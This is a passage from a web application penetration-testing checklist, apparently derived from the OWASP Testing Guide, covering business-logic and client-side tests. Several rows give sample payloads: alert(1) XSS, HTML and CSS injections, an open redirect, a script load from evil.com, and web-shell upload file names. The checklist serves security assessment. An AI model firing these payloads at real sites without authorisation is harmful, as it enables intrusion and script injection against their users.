• Cipher text decryption fails due to padding errors."	PadBuster, Poracle, python-paddingoracle, POET	Not Started	
- [ ]-CRYPST-003	Testing for Sensitive information sent via unencrypted channels	"Check sensitive data during the transmission:
• Information used in authentication (e.g. Credentials, PINs, Session
identifiers, Tokens, Cookies…)
• Information protected by laws, regulations or specific organizational
policy (e.g. Credit Cards, Customers data)"	Burp Proxy, ZAP, Curl	Not Started	
					
Business logic Testing	Test Name	Description	Tools	Result	Remark
- [ ]-BUSLOGIC-001	Test Business Logic Data Validation	"• Looking for data entry points or hand off points between systems or software.
• Once found try to insert logically invalid data into the application/system. "	Burp Proxy, ZAP	Not Started	
- [ ]-BUSLOGIC-002	Test Ability to Forge Requests	"• Looking for guessable, predictable or hidden functionality of fields.
• Once found try to insert logically valid data into the application/system allowing the user go through the application/system against the normal busineess logic workflow. "	Burp Proxy, ZAP	Not Started	
- [ ]-BUSLOGIC-003	Test Integrity Checks	"•Looking for parts of the application/system (components i.e. For example, input fields, databases or logs) that move, store or handle data/information.
• For each identified component determine what type of data/information is logically acceptable and what types the application/system should guard against. Also, consider who according to the business logic is allowed to insert, update and delete data/information and in each component.
• Attempt to insert, update or edit delete the data/information values with invalid data/information into each component (i.e. input, database, or log) by users that .should not be allowed per the busines logic workflow. "	Burp Proxy, ZAP	Not Started	
- [ ]-BUSLOGIC-004	Test for Process Timing	"• Looking for application/system functionality that may
be impacted by time. Such as execution time or actions that
help users predict a future outcome or allow one to circumvent
any part of the business logic or workflow. For example, not
completing transactions in an expected time.
• Develop and execute the mis-use cases ensuring that attackers
can not gain an advantage based on any timing."	Burp Proxy, ZAP	Not Started	
- [ ]-BUSLOGIC-005	Test Number of Times a Function Can be Used Limits	"• Looking for functions or features in the application or system that should not be executed more that a single time or specified number of times during the business logic workflow.
• For each of the functions and features found that should only be executed a single time or specified number of times during the business logic workflow, develop abuse/misuse cases that may allow a user to execute more than the allowable number of times."	Burp Proxy, ZAP	Not Started	
- [ ]-BUSLOGIC-006	Testing for the Circumvention of Work Flows	"• Looking for methods to skip or go to steps in the application process in a different order from the designed/intended business logic flow.
• For each method develop a misuse case and try to circumvent or perform an action that is ""not acceptable"" per the the business logic workflow. "	Burp Proxy, ZAP	Not Started	
- [ ]-BUSLOGIC-007	Test Defenses Against Application Mis-use	"Measures that might indicate the application has in-built self-defense:
• Changed responses
• Blocked requests
• Actions that log a user out or lock their account"	Burp Proxy, ZAP	Not Started	
- [ ]-BUSLOGIC-008	Test Upload of Unexpected File Types	"• Review the project documentation and perform some exploratory testing looking for file types that should be ""unsupported"" by the application/system.
• Try to upload these “unsupported” files an verify that it are properly rejected.
• If multiple files can be uploaded at once, there must be tests in place to verify that each file is properly evaluated. 
PS. file.phtml, shell.phPWND, SHELL~1.PHP"	Burp Proxy, ZAP	Not Started	
- [ ]-BUSLOGIC-009	Test Upload of Malicious Files	"• Develop or acquire a known “malicious” file.
• Try to upload the malicious file to the application/system and verify that it is correctly rejected.
• If multiple files can be uploaded at once, there must be tests in place to verify that each file is properly evaluated. "	Burp Proxy, ZAP	Not Started	
					
Client Side Testing	Test Name	Description	Tools	Result	Remark
- [ ]-CLIENT-001	Testing for DOM based Cross Site Scripting	Test for the user inputs obtained from client-side JavaScript Objects	Burp Proxy, DOMinator	Not Started	
- [ ]-CLIENT-002	Testing for JavaScript Execution	"Inject JavaScript code:
www.victim.com/?javascript:alert(1)"	Burp Proxy, ZAP	Not Started	
- [ ]-CLIENT-003	Testing for HTML Injection	"Send malicious HTML code:
?user=<img%20src='aaa'%20onerror=alert(1)>"	Burp Proxy, ZAP	Not Started	
- [ ]-CLIENT-004	Testing for Client Side URL Redirect	"Modify untrusted URL input to a malicious site: (Open Redirect)
?redirect=www.fake-target.site "	Burp Proxy, ZAP	Not Started	
- [ ]-CLIENT-005	Testing for CSS Injection	"Inject code in the CSS context :
•  www.victim.com/#red;-o-link:'javascript:alert(1)';-o-link-source:current; (Opera [8,12])
•  www.victim.com/#red;-:expression(alert(URL=1)); (IE 7/8)"	Burp Proxy, ZAP	Not Started	
- [ ]-CLIENT-006	Testing for Client Side Resource Manipulation	"External JavaScript could be easily injected in the trusted web site
www.victim.com/#http://evil.com/js.js"	Burp Proxy, ZAP	Not Started	
- [ ]-CLIENT-007	Test Cross Origin Resource Sharing	"Check the HTTP headers in order to understand how CORS is
used (Origin Header)"	Burp Proxy, ZAP	Not Started	
- [ ]-CLIENT-008	Testing for Cross Site Flashing	Decompile, Undefined variables, Unsafe methods, Include malicious SWF (http://victim/file.swf?lang=http://evil	FlashBang, Flare, Flasm, SWFScan, SWF Intruder	Not Started	
- [ ]-CLIENT-009	Testing for Clickjacking	Discover if a website is vulnerable by loading into an iframe, create simple web page that includes a frame containing the target.	Burp Proxy, ClickjackingTool	Not Started	
- [ ]-CLIENT-010	Testing WebSockets	Identify that the application is using WebSockets by inspecting ws:// or wss:// URI scheme.Use Google Chrome's Developer Tools to view the Network WebSocket communication. Check Origin, Confidentiality and Integrity, Authentication, Authorization, Input Sanitization	Burp Proxy, Chrome, ZAP, WebSocket Client	Not Started	
- [ ]-CLIENT-011	Test Web Messaging	Analyse JavaScript code looking for how Web Messaging is implemented. How the website is restricting messages from untrusted domain and how the data is handled even for trusted domains	Burp Proxy, ZAP	Not Started	
- [ ]-CLIENT-012	Test Local Storage	"Determine whether the website is storing sensitive data in the storage. XSS in localstorage 
http://server/StoragePOC.html#<img src=x onerror=alert(1)>"	Chrome, Firebug, Burp Proxy, ZAP	Not Started	
